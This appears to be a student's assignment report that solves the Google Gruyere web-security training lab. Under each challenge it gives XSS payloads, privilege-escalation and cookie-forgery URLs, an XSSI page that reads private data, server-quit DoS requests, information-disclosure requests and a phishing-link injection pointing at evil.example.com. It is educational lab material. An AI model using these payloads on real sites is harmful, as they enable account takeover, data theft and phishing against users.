# Assignment 4 Report

Write your exploit (i.e. attack code) under each heading below.

## File Upload XSS

index.html
```js
<script>alert('hello world')</script>
```

## Reflected XSS

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/%3Cscript%3Ealert('hello%20world')%3C/script%3E
```

## Stored XSS

```html
<a onmouseover="alert('hello world')">Click here!</a>
```

## Stored XSS via HTML Attribute

```
blue' onmouseover="alert('hello world')"
```

## Stored XSS via AJAX

```
start <span style=display:none>"
+ alert('hello world')
+ "</span>end
```

## Reflected XSS via AJAX

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/feed.gtl?uid=%3Cscript%3Ealert(%27hello%20world%27)%3C/script%3E
```

## Elevation of Privilege

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/saveprofile?action=update&is_admin=True&uid=siddy
```

## Cookie Manipulation

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/saveprofile?action=new&uid=administrator|admin|author&pw=password
```

## XSRF Challenge

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/deletesnippet?index=0
```

## XSSI Challenge

```html
<!DOCTYPE html>
<html>
  <body>
      <script>
      function _feed(data) {
        alert('Private Snippet: ' + data['private_snippet']);
      }
    </script>
    <script src="https://google-gruyere.appspot.com/572638720274820579346510292590698872448/feed.gtl"></script>
  </body>
</html>
```

## Information disclosure via path traversal

Just read through this challenge. No need to submit a solution. AppEngine automatically "simplifies" the URL with a 302 redirect, which breaks the attack.

## Data tampering via path traversal

Just read through this challenge. No need to submit a solution. AppEngine automatically "simplifies" the URL with a 302 redirect, which breaks the attack.

## DoS - Quit the Server

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/quitserver
```

## DoS - Overloading the Server

Just read through this challenge. No need to submit a solution. AppEngine doesn't seem vulnerable to path traversal which breaks the attack.

## Code Execution Challenge

```python
print('hello world')
```

## Information disclosure #1

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/dump.gtl
```

## Information disclosure #2

```shell
curl 'https://google-gruyere.appspot.com/572638720274820579346510292590698872448/upload2' \
  -H 'authority: google-gruyere.appspot.com' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
  -H 'cache-control: no-cache' \
  -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryDTIE1lBG8TPUXl0V' \
  -H 'cookie: GRUYERE=43221276|siddy||author' \
  -H 'origin: https://google-gruyere.appspot.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://google-gruyere.appspot.com/572638720274820579346510292590698872448/upload.gtl' \
  -H 'sec-ch-ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"' \
  -H 'sec-ch-ua-arch: "arm"' \
  -H 'sec-ch-ua-bitness: "64"' \
  -H 'sec-ch-ua-full-version-list: "Chromium";v="118.0.5993.88", "Google Chrome";v="118.0.5993.88", "Not=A?Brand";v="99.0.0.0"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-model: ""' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-ch-ua-platform-version: "14.0.0"' \
  -H 'sec-ch-ua-wow64: ?0' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' \
  --data-raw $'------WebKitFormBoundaryDTIE1lBG8TPUXl0V\r\nContent-Disposition: form-data; name="upload_file"; filename="dump.gtl"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryDTIE1lBG8TPUXl0V--\r\n' \
  --compressed
```

## Information disclosure #3

```shell
https://google-gruyere.appspot.com/572638720274820579346510292590698872448/newsnippet2?snippet=%7B%7B_db%3Apprint%7D%7D%0D%0A'
```

## DoS via AJAX

```shell
curl 'https://google-gruyere.appspot.com/572638720274820579346510292590698872448/newsnippet2?snippet=hello+world' \
  -H 'authority: google-gruyere.appspot.com' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
  -H 'cache-control: no-cache' \
  -H 'cookie: GRUYERE=82862944|private_snippet||author' \
  -H 'pragma: no-cache' \
  -H 'referer: https://google-gruyere.appspot.com/572638720274820579346510292590698872448/newsnippet.gtl' \
  -H 'sec-ch-ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"' \
  -H 'sec-ch-ua-arch: "arm"' \
  -H 'sec-ch-ua-bitness: "64"' \
  -H 'sec-ch-ua-full-version-list: "Chromium";v="118.0.5993.88", "Google Chrome";v="118.0.5993.88", "Not=A?Brand";v="99.0.0.0"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-model: ""' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-ch-ua-platform-version: "14.0.0"' \
  -H 'sec-ch-ua-wow64: ?0' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' \
  --compressed
```

## Phishing via AJAX

```shell
curl 'https://google-gruyere.appspot.com/572638720274820579346510292590698872448/newsnippet2?snippet=%3Ca+href%3D%27https%3A%2F%2Fevil.example.com%2Flogin%27%3ESign+in%3C%2Fa%3E+%7C+%3Ca+href%3D%27https%3A%2F%2Fevil.example.com%2Fnewaccount.gtl%27%3ESign+up%3C%2Fa%3E' \
  -H 'authority: google-gruyere.appspot.com' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
  -H 'cache-control: no-cache' \
  -H 'cookie: GRUYERE=96645424|menu-right||author' \
  -H 'pragma: no-cache' \
  -H 'referer: https://google-gruyere.appspot.com/572638720274820579346510292590698872448/newsnippet.gtl' \
  -H 'sec-ch-ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"' \
  -H 'sec-ch-ua-arch: "arm"' \
  -H 'sec-ch-ua-bitness: "64"' \
  -H 'sec-ch-ua-full-version-list: "Chromium";v="118.0.5993.88", "Google Chrome";v="118.0.5993.88", "Not=A?Brand";v="99.0.0.0"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-model: ""' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-ch-ua-platform-version: "14.0.0"' \
  -H 'sec-ch-ua-wow64: ?0' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' \
  --compressed
```
